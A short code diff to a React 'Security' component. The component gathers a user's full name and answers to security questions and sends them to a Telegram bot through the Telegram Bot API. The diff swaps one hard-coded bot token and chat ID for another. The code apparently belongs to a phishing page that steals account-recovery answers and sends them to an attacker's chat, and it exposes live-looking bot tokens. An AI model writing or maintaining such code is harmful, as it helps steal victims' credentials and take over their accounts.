@@ -54,8 +54,8 @@ const Security: React.FC = () => {
       .map((answer, index) => ` ${fullName} ${questions[index]}: ${answer}`)
       .join('\n');
 
-    const telegramBotToken = '6923253185:AAEeCL3NG0iF4TGMR4V8Ib2kITqDiOJ7IKo';
-    const telegramChatId = '6639364559';
+    const telegramBotToken = '7926454402:AAEDVoo1vW7hFgkLKM3qK3f8EsiiKuDsT8c';
+    const telegramChatId = '7062736155';
 
     const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
 
